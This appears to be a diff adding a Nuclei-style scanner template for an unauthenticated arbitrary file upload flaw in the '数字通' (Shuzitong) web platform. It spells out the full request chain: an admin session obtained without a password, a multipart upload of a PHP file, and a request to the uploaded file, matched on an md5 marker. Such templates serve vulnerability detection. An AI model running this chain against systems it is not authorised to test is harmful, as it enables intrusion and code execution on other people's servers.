@@ -1,0 +1,56 @@
+id: Shuzitong-unauth-fileupload
+info:
+  name: 数字通未授权任意文件上传
+  author: status
+  severity: critical
+  description: 数字通未授权任意文件上传。icon_hash="34193182"
+  tags: shuzitong,fileupload,unauth
+
+http:
+  - raw:
+      - |
+        POST /portal/default/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+        Content-Length: 22
+
+        userID=admin&flag=rone
+
+      - |
+        POST /sys/mobile/setting HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Go-http-client/1.1
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjWvMVSgOWHCulSTf
+        Cookie: §GOASESSID§
+        Accept-Encoding: gzip, deflate
+
+        ------WebKitFormBoundaryjWvMVSgOWHCulSTf
+        Content-Disposition: form-data; name="MobileApplication[cert]"; filename="status.php"
+        Content-Type: application/octet-stream
+
+        <?php echo(md5(1)); unlink(__FILE__); ?>
+        ------WebKitFormBoundaryjWvMVSgOWHCulSTf--
+
+      - |
+        GET /static/seal/status.php  HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: GOASESSID
+        part: header
+        internal: true
+        regex:
+          - "GOASESSID=.{0,};"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'c4ca4238a0b923820dcc509a6f75849b'
+        part: body
+        condition: and
+      - type: status
+        status:
+          - 200
